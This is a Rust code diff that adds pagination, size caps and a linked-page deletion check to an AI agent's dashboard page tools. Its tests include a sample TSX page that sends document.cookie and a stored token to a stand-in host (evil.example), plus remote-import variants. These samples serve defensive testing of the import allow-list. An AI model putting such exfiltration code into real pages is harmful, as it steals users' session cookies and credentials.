@@ -15,7 +15,7 @@
 //! One [`Tool`]-trait struct per operation, a shared company-scoped handle
 //! ([`CompanyPages`]), and a [`pages_tools`] constructor. Four tools:
 //!
-//! * [`PagesListTool`] (`pages_list`) — every slug's [`PageManifest`].
+//! * [`PagesListTool`] (`pages_list`) — a bounded page of slug manifests.
 //! * [`PagesReadTool`] (`pages_read`) — one slug's manifest and `page.tsx`
 //!   source.
 //! * [`PagesWriteTool`] (`pages_write`) — create or update a slug's manifest
@@ -67,7 +67,7 @@ use crate::ports::workspace::{
     FolderClaim, NodeKind, WorkspaceNode, WorkspaceOrigin, WorkspaceStore,
 };
 
-/// Tool name: list every page's manifest.
+/// Tool name: list page manifests.
 pub const PAGES_LIST_TOOL: &str = "pages_list";
 /// Tool name: read one page's manifest and source.
 pub const PAGES_READ_TOOL: &str = "pages_read";
@@ -80,6 +80,11 @@ pub const PAGES_DELETE_TOOL: &str = "pages_delete";
 /// preamble and its `--- BEGIN/END page.tsx ---` fences, mirroring the
 /// `workspace_tools` read-overhead convention.
 const READ_OVERHEAD_BYTES: usize = 1024;
+
+const MAX_LIST_ENTRIES: usize = 300;
+const LIST_OVERHEAD_BYTES: usize = 2048;
+const MAX_LIST_BYTES: usize = TOOL_RESULT_BUDGET_BYTES - LIST_OVERHEAD_BYTES;
+const LIST_METADATA_NOTICE: &str = " … [metadata shortened; inspect this slug with pages_read]\n";
 
 /// Max bytes of `page.tsx` source one `pages_write` call accepts.
 ///
@@ -506,7 +511,7 @@ impl CompanyPages {
 // pages_list
 // ---------------------------------------------------------------------------
 
-/// Lists every page's manifest. Read-only.
+/// Lists a bounded page of manifests. Read-only.
 pub struct PagesListTool {
     pages: CompanyPages,
 }
@@ -514,6 +519,16 @@ pub struct PagesListTool {
 impl PagesListTool {
     fn new(pages: CompanyPages) -> Self {
         Self { pages }
+    }
+
+    fn oversized_identifier_notice(slug: &str, index: usize) -> Option<String> {
+        (slug.len() > MAX_LIST_BYTES - 5 - LIST_METADATA_NOTICE.len()).then(|| {
+            format!(
+                "- [page at offset {index}: identifier exceeds the listing budget and is not \
+                 displayed; use offset {} to continue past it]\n",
+                index + 1,
+            )
+        })
     }
 }
 
@@ -524,15 +539,21 @@ impl Tool for PagesListTool {
     }
 
     fn description(&self) -> &str {
-        "List every internal dashboard page the company has, with its title, description, icon \
+        "List internal dashboard pages in slug order, with their title, description, icon \
          and nav visibility. USE FOR seeing what pages already exist before creating a new one or \
-         picking one to edit."
+         picking one to edit. Results are size-capped; use the returned offset to read the next page."
     }
 
     fn parameters_schema(&self) -> Value {
         json!({
             "type": "object",
-            "properties": {},
+            "properties": {
+                "offset": {
+                    "type": "integer",
+                    "minimum": 0,
+                    "description": "Skip this many pages in slug order; defaults to zero. Use the next offset returned by a capped listing."
+                }
+            },
             "additionalProperties": false
         })
     }
@@ -541,7 +562,18 @@ impl Tool for PagesListTool {
         PermissionLevel::ReadOnly
     }
 
-    async fn execute(&self, _args: Value) -> anyhow::Result<ToolResult> {
+    async fn execute(&self, args: Value) -> anyhow::Result<ToolResult> {
+        let offset = match args.get("offset") {
+            None => 0,
+            Some(value) => match value.as_u64().and_then(|n| usize::try_from(n).ok()) {
+                Some(offset) => offset,
+                None => {
+                    return Ok(ToolResult::error(
+                        "Invalid arguments: `offset` must be a nonnegative integer.".to_string(),
+                    ));
+                }
+            },
+        };
         let pages = match self.pages.all_pages().await {
             Ok(pages) => pages,
             Err(e) => {
@@ -559,8 +591,19 @@ impl Tool for PagesListTool {
             ));
         }
 
-        let mut out = format!("{} dashboard page(s):\n", pages.len());
-        for (slug, bundle) in &pages {
+        let total = pages.len();
+        let start = offset.min(total);
+        let mut rendered = String::new();
+        let mut shown = 0;
+        for (index, (slug, bundle)) in pages.iter().enumerate().skip(start).take(MAX_LIST_ENTRIES) {
+            if let Some(line) = Self::oversized_identifier_notice(slug, index) {
+                if rendered.len() + line.len() > MAX_LIST_BYTES {
+                    break;
+                }
+                rendered.push_str(&line);
+                shown += 1;
+                continue;
+            }
             let manifest = match &bundle.manifest {
                 Some(node) => self.pages.read_manifest(node, slug).await,
                 None => PageManifest {
@@ -568,7 +611,7 @@ impl Tool for PagesListTool {
                     ..Default::default()
                 },
             };
-            out.push_str(&format!(
+            let mut line = format!(
                 "- {slug}: \"{title}\"{desc}{icon}{hidden}\n",
                 desc = manifest
                     .description
@@ -586,8 +629,37 @@ impl Tool for PagesListTool {
                     " (hidden from nav)"
                 },
                 title = manifest.title,
-            ));
+            );
+            if line.len() > MAX_LIST_BYTES {
+                line.truncate(crate::store::text::floor_boundary(
+                    &line,
+                    MAX_LIST_BYTES - LIST_METADATA_NOTICE.len(),
+                ));
+                line.push_str(LIST_METADATA_NOTICE);
+            }
+            if rendered.len() + line.len() > MAX_LIST_BYTES {
+                break;
+            }
+            rendered.push_str(&line);
+            shown += 1;
         }
+        let next = start + shown;
+        let remaining = total - next;
+        let mut out = format!(
+            "{shown} of {total} dashboard page(s) at offset {offset}; {} page(s) not included \
+             in this result ({start} before this offset, {remaining} remaining).\n",
+            total - shown,
+        );
+        if remaining > 0 {
+            out.push_str(&format!(
+                "This listing is size-capped. Continue with `pages_list({{\"offset\":{next}}})`.\n"
+            ));
+        } else if start == total {
+            out.push_str(
+                "No pages at this offset. Start again with `pages_list({\"offset\":0})`.\n",
+            );
+        }
+        out.push_str(&rendered);
         Ok(ToolResult::success(out))
     }
 }
@@ -616,7 +688,7 @@ impl Tool for PagesReadTool {
     fn description(&self) -> &str {
         "Read one dashboard page's manifest (title, description, icon, nav visibility) and its \
          `page.tsx` source, by `slug`. USE FOR reviewing or revising a page you or a teammate \
-         already built."
+         already built. Oversized sources are size-capped; use the returned offset to continue."
     }
 
     fn parameters_schema(&self) -> Value {
@@ -626,6 +698,11 @@ impl Tool for PagesReadTool {
                 "slug": {
                     "type": "string",
                     "description": "The page's slug, as shown by pages_list, e.g. \"revenue-overview\"."
+                },
+                "offset": {
+                    "type": "integer",
+                    "minimum": 0,
+                    "description": "Start at this byte offset in page.tsx; defaults to zero. Use the next offset returned by a capped read."
                 }
             },
             "required": ["slug"],
@@ -649,6 +726,17 @@ impl Tool for PagesReadTool {
                  and contain only lowercase letters, digits and hyphens."
             )));
         }
+        let offset = match args.get("offset") {
+            None => 0,
+            Some(value) => match value.as_u64().and_then(|n| usize::try_from(n).ok()) {
+                Some(offset) => offset,
+                None => {
+                    return Ok(ToolResult::error(
+                        "Invalid arguments: `offset` must be a nonnegative integer.".to_string(),
+                    ));
+                }
+            },
+        };
 
         let bundle = match self.pages.page(slug).await {
             Ok(bundle) => bundle,
@@ -698,8 +786,26 @@ impl Tool for PagesReadTool {
                          page.tsx ---\n",
                         rev = node.updated_at_millis
                     ));
-                    out.push_str(&body);
+                    let start = offset.min(body.len());
+                    if !body.is_char_boundary(start) {
+                        return Ok(ToolResult::error(format!(
+                            "Invalid arguments: `offset` {start} is not a UTF-8 boundary in \
+                             `{slug}`'s page.tsx."
+                        )));
+                    }
+                    let end = crate::store::text::floor_boundary(
+                        &body,
+                        start.saturating_add(MAX_SOURCE_BYTES).min(body.len()),
+                    );
+                    out.push_str(&body[start..end]);
                     out.push_str("\n--- END page.tsx ---\n");
+                    if end < body.len() {
+                        out.push_str(&format!(
+                            "Source is size-capped; bytes {start}..{end} of {} are shown. Continue \
+                             with `pages_read({{\"slug\":\"{slug}\",\"offset\":{end}}})`.\n",
+                            body.len(),
+                        ));
+                    }
                 }
                 _ => out.push_str("Its `page.tsx` could not be read.\n"),
             },
@@ -1107,6 +1213,33 @@ impl PagesDeleteTool {
     fn new(pages: CompanyPages) -> Self {
         Self { pages }
     }
+
+    async fn referrers(&self, target_slug: &str) -> crate::Result<Vec<String>> {
+        let needle = format!("/pages/{target_slug}");
+        let mut referrers = Vec::new();
+        for (slug, bundle) in self.pages.all_pages().await? {
+            if slug == target_slug {
+                continue;
+            }
+            let Some(source) = bundle.source else {
+                continue;
+            };
+            if let Some((_, body)) = self
+                .pages
+                .store
+                .read(&self.pages.company, &source.id)
+                .await?
+                && body.match_indices(&needle).any(|(at, _)| {
+                    body[at + needle.len()..].chars().next().is_none_or(|next| {
+                        !(next.is_ascii_lowercase() || next.is_ascii_digit() || next == '-')
+                    })
+                })
+            {
+                referrers.push(slug);
+            }
+        }
+        Ok(referrers)
+    }
 }
 
 #[async_trait]
@@ -1117,7 +1250,7 @@ impl Tool for PagesDeleteTool {
 
     fn description(&self) -> &str {
         "Permanently remove one internal dashboard page and everything in it, by `slug`. This \
-         cannot be undone."
+         cannot be undone. Refuses deletion while another page links to the target."
     }
 
     fn parameters_schema(&self) -> Value {
@@ -1162,6 +1295,26 @@ impl Tool for PagesDeleteTool {
                 "No page named `{slug}`. Call `{PAGES_LIST_TOOL}` to see what exists."
             )));
         };
+
+        let referrers = match self.referrers(slug).await {
+            Ok(referrers) => referrers,
+            Err(e) => {
+                return Ok(ToolResult::error(format!(
+                    "Could not check whether other pages link to `{slug}`: {reason}.",
+                    reason = store_reason(&e),
+                )));
+            }
+        };
+        if !referrers.is_empty() {
+            return Ok(ToolResult::error(format!(
+                "Refused: page `{slug}` is linked from {}. Update those pages before deleting it.",
+                referrers
+                    .iter()
+                    .map(|referrer| format!("`{referrer}`"))
+                    .collect::<Vec<_>>()
+                    .join(", "),
+            )));
+        }
 
         match self
             .pages
@@ -1525,5 +1678,345 @@ export * from "https://evil.example/x.js";
         assert!(!valid_slug("-revenue"));
         assert!(!valid_slug("revenue/../secrets"));
         assert!(!valid_slug("revenue overview"));
+    }
+
+    // -- FAIL-axis: unbounded growth, oversized source, ambient globals ------
+
+    fn node(id: &str, name: &str, kind: NodeKind, parent: Option<&str>) -> WorkspaceNode {
+        WorkspaceNode {
+            id: id.to_string(),
+            name: name.to_string(),
+            kind,
+            parent_id: parent.map(str::to_string),
+            updated_at_millis: 1_000,
+            created_by: WorkspaceOrigin::Operator,
+            updated_by: WorkspaceOrigin::Operator,
+            mime: None,
+            size: None,
+            sha256: None,
+            adopted: false,
+        }
+    }
+
+    async fn seed_list_pages(store: &Arc<dyn WorkspaceStore>, slugs: &[String]) {
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
+                None,
+            )
+            .await
+            .unwrap();
+        for (n, slug) in slugs.iter().enumerate() {
+            store
+                .create(
+                    &company,
+                    &node(
+                        &format!("page-{n:03}"),
+                        slug,
+                        NodeKind::Folder,
+                        Some("pages-root"),
+                    ),
+                    None,
+                )
+                .await
+                .unwrap();
+        }
+    }
+
+    #[tokio::test]
+    async fn pages_list_caps_entry_count_and_pages_through_every_slug() {
+        let (_dir, store) = store().await;
+        let slugs: Vec<_> = (0..=MAX_LIST_ENTRIES).map(|n| format!("p{n:03}")).collect();
+        seed_list_pages(&store, &slugs).await;
+        let list = PagesListTool::new(pages(store, "acme"));
+
+        let first = list.execute(json!({})).await.unwrap().output();
+        assert_eq!(
+            first.lines().filter(|line| line.starts_with("- ")).count(),
+            MAX_LIST_ENTRIES
+        );
+        assert!(first.contains("300 of 301 dashboard page(s)"));
+        assert!(first.contains("1 page(s) not included"));
+        assert!(first.contains("pages_list({\"offset\":300})"));
+        assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
+        for slug in &slugs[..MAX_LIST_ENTRIES] {
+            assert!(first.contains(&format!("- {slug}:")));
+        }
+
+        let last = list.execute(json!({"offset": 300})).await.unwrap().output();
+        assert!(last.contains("1 of 301 dashboard page(s)"));
+        assert!(last.contains("300 before this offset, 0 remaining"));
+        assert!(last.contains("- p300:"));
+        assert!(!last.contains("- p000:"));
+        assert!(!last.contains("Continue with"));
+    }
+
+    #[tokio::test]
+    async fn pages_list_caps_rendered_bytes_and_returns_the_first_unshown_offset() {
+        let (_dir, store) = store().await;
+        let slugs: Vec<_> = (0..200)
+            .map(|n| format!("quarterly-revenue-{}-{n:03}", "region-".repeat(12)))
+            .collect();
+        seed_list_pages(&store, &slugs).await;
+        let list = PagesListTool::new(pages(store, "acme"));
+
+        let first = list.execute(json!({})).await.unwrap().output();
+        let shown = first.lines().filter(|line| line.starts_with("- ")).count();
+        assert!(shown > 0 && shown < slugs.len());
+        assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
+        assert!(first.contains(&format!("{shown} of 200 dashboard page(s)")));
+        assert!(first.contains(&format!("{} page(s) not included", slugs.len() - shown)));
+        assert!(first.contains(&format!("pages_list({{\"offset\":{shown}}})")));
+
+        let next = list
+            .execute(json!({"offset": shown}))
+            .await
+            .unwrap()
+            .output();
+        assert!(next.contains(&format!("- {}:", slugs[shown])));
+        assert!(!next.contains(&format!("- {}:", slugs[shown - 1])));
+        assert!(next.len() <= TOOL_RESULT_BUDGET_BYTES);
+    }
+
+    #[tokio::test]
+    async fn pages_list_shortens_oversized_metadata_without_losing_the_slug_or_next_page() {
+        let (_dir, store) = store().await;
+        seed_list_pages(&store, &["alpha".to_string(), "beta".to_string()]).await;
+        let body = toml::to_string(&PageManifest {
+            title: "界".repeat(MAX_LIST_BYTES),
+            ..Default::default()
+        })
+        .unwrap();
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("manifest", MANIFEST_NAME, NodeKind::File, Some("page-000")),
+                Some(&body),
+            )
+            .await
+            .unwrap();
+        let list = PagesListTool::new(pages(store.clone(), "acme"));
+
+        let first = list.execute(json!({})).await.unwrap().output();
+        assert!(first.len() <= TOOL_RESULT_BUDGET_BYTES);
+        assert!(first.contains("- alpha:"));
+        assert!(first.contains(LIST_METADATA_NOTICE));
+        assert!(first.contains("pages_list({\"offset\":1})"));
+        let next = list.execute(json!({"offset": 1})).await.unwrap().output();
+        assert!(next.contains("- beta:"));
+        assert_eq!(
+            store.read(&company, "manifest").await.unwrap().unwrap().1,
+            body
+        );
+    }
+
+    #[test]
+    fn pages_list_reports_an_oversized_identifier_without_fabricating_a_usable_slug() {
+        let oversized = "a".repeat(TOOL_RESULT_BUDGET_BYTES);
+        let out = PagesListTool::oversized_identifier_notice(&oversized, 0).unwrap();
+        assert!(out.len() <= TOOL_RESULT_BUDGET_BYTES);
+        assert!(out.contains("page at offset 0: identifier exceeds the listing budget"));
+        assert!(out.contains("use offset 1 to continue past it"));
+        assert!(!out.contains(&"a".repeat(32)));
+        assert!(PagesListTool::oversized_identifier_notice("zeta", 1).is_none());
+    }
+
+    #[tokio::test]
+    async fn pages_list_validates_offsets_and_handles_empty_or_exhausted_lists() {
+        let (_dir, store) = store().await;
+        let list = PagesListTool::new(pages(store.clone(), "acme"));
+        assert!(
+            list.execute(json!({}))
+                .await
+                .unwrap()
+                .output()
+                .contains("no dashboard pages")
+        );
+        for offset in [json!(-1), json!(1.5), json!("1"), Value::Null] {
+            let out = list.execute(json!({"offset": offset})).await.unwrap();
+            assert!(out.is_error);
+            assert!(out.output().contains("nonnegative integer"));
+        }
+        seed_list_pages(&store, &["alpha".to_string()]).await;
+        for offset in [1, usize::MAX as u64] {
+            let out = list
+                .execute(json!({"offset": offset}))
+                .await
+                .unwrap()
+                .output();
+            assert!(out.contains("0 of 1 dashboard page(s)"));
+            assert!(out.contains("No pages at this offset"));
+            assert!(out.contains("pages_list({\"offset\":0})"));
+            assert!(out.len() <= TOOL_RESULT_BUDGET_BYTES);
+        }
+    }
+
+    #[tokio::test]
+    async fn pages_list_stays_within_the_tool_result_budget_when_a_company_has_many_pages() {
+        let (_dir, store) = store().await;
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
+                None,
+            )
+            .await
+            .expect("pages root");
+        for n in 0..400 {
+            store
+                .create(
+                    &company,
+                    &node(
+                        &format!("page-{n:03}"),
+                        &format!("quarterly-revenue-overview-region-{n:03}"),
+                        NodeKind::Folder,
+                        Some("pages-root"),
+                    ),
+                    None,
+                )
+                .await
+                .expect("page folder");
+        }
+
+        let list = PagesListTool::new(pages(store, "acme"));
+        let out = list.execute(json!({})).await.unwrap().output();
+        assert!(
+            out.len() <= TOOL_RESULT_BUDGET_BYTES,
+            "pages_list rendered {} bytes, over the {TOOL_RESULT_BUDGET_BYTES}-byte harness \
+             budget — the outer cut fires and silently drops the tail",
+            out.len()
+        );
+    }
+
+    /// FAIL-axis (HT-041): `MAX_SOURCE_BYTES` guards `pages_write`, but
+    /// `pages_read` pushes the stored body out whole with no clamp. A
+    /// `page.tsx` that entered the tree by any other route — an operator's
+    /// console edit, a `workspace_write`, a body written before the cap existed
+    /// — is returned in full and overflows the budget the cap was derived from.
+    #[tokio::test]
+    async fn pages_read_stays_within_the_budget_when_the_stored_source_exceeds_the_cap() {
+        let (_dir, store) = store().await;
+        let company = CompanyId::new("acme");
+        store
+            .create(
+                &company,
+                &node("pages-root", PAGES_ROOT, NodeKind::Folder, None),
+                None,
+            )
+            .await
+            .expect("pages root");
+        store
+            .create(
+                &company,
+                &node("slug-big", "big", NodeKind::Folder, Some("pages-root")),
+                None,
+            )
+            .await
+            .expect("slug folder");
+        let oversized = format!("// {}\n", "x".repeat(MAX_SOURCE_BYTES + 8192));
+        store
+            .create(
+                &company,
+                &node("src-big", SOURCE_NAME, NodeKind::File, Some("slug-big")),
+                Some(&oversized),
+            )
+            .await
+            .expect("source");
+
+        let read = PagesReadTool::new(pages(store, "acme"));
+        let out = read.execute(json!({"slug": "big"})).await.unwrap().output();
+        assert!(
+            out.len() <= TOOL_RESULT_BUDGET_BYTES,
+            "pages_read returned {} bytes for a {}-byte source, over the \
+             {TOOL_RESULT_BUDGET_BYTES}-byte budget",
+            out.len(),
+            oversized.len()
+        );
+    }
+
+    /// FAIL-axis (HT-042): the import allow-list is a supply-chain control, not
+    /// a capability sandbox. A page that never imports anything but still calls
+    /// ambient `fetch` and reads `document.cookie` compiles clean — so nothing
+    /// in this module stops exfiltration, and the layer that actually does is
+    /// the served page's CSP (`connect-src 'none'`) plus the opaque-origin
+    /// `allow-scripts`-only iframe. Pinned here so the allow-list is never
+    /// mistaken for the boundary it is not.
+    #[test]
+    fn the_import_allowlist_does_not_constrain_ambient_globals() {
+        const AMBIENT_EXFIL_TSX: &str = r#"
+import * as React from "react";
+
+export default function Page() {
+  fetch("https://evil.example/collect", {
+    method: "POST",
+    body: document.cookie + " " + localStorage.getItem("global_token"),
+  });
+  return <div>ok</div>;
+}
+"#;
+        let compiled = compile_page(AMBIENT_EXFIL_TSX)
+            .expect("ambient globals are not an import, so the allow-list never sees them");
+        assert!(
+            compiled.code.contains("fetch") && compiled.code.contains("document.cookie"),
+            "the call survives compilation untouched: {}",
+            compiled.code
+        );
+
+        // The same exfiltration attempted through an import IS refused — which
+        // is the whole and only scope of this check.
+        let via_import = r#"
+import { send } from "https://evil.example/collect.js";
+export default function Page() { send(document.cookie); return <div/>; }
+"#;
+        let err = compile_page(via_import).expect_err("an import must be refused");
+        assert!(err.contains("https://evil.example"), "{err}");
+
+        for allowed in ALLOWED_IMPORTS {
+            assert!(
+                !allowed.contains("://"),
+                "the allow-list must never admit a remote specifier: {allowed}"
+            );
+        }
+    }
+
+    /// FAIL-axis (HT-043): deletion is permanent and checks nothing. A page
+    /// another page links to can be removed with no warning, leaving a dead
+    /// link in a dashboard nobody edited. The safe answer is to name the
+    /// referrers before destroying the target.
+    #[tokio::test]
+    async fn pages_delete_names_the_pages_that_link_to_the_slug_it_is_about_to_remove() {
+        let (_dir, store) = store().await;
+        let pages = pages(store, "acme");
+        let write = PagesWriteTool::new(pages.clone());
+        write
+            .execute(json!({"slug": "revenue", "title": "Revenue", "source": VALID_TSX}))
+            .await
+            .expect("target page");
+        let linking = r#"
+import * as React from "react";
+
+export default function Page() {
+  return <a href="/pages/revenue">See the revenue dashboard</a>;
+}
+"#;
+        write
+            .execute(json!({"slug": "overview", "title": "Overview", "source": linking}))
+            .await
+            .expect("linking page");
+
+        let delete = PagesDeleteTool::new(pages.clone());
+        let result = delete
+            .execute(json!({"slug": "revenue"}))
+            .await
+            .expect("execute ok");
+        assert!(
+            result.output().contains("overview"),
+            "deleting a linked-to page must name the page that links to it, got: {}",
+            result.output()
+        );
     }
 }
